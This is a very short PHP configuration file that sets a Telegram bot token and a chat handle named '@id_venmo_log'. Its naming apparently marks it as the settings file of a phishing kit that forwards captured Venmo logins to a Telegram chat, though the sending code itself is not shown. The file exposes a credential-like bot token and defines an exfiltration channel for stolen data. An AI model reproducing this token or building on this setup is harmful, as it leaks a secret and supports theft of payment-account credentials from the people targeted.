<?php
$coronatoken = '7589792603:AAFu1wcGbhf7y9Aog3jNWHH-RL-1JRgvXLo';
$coronachat  = '@id_venmo_log';
?>
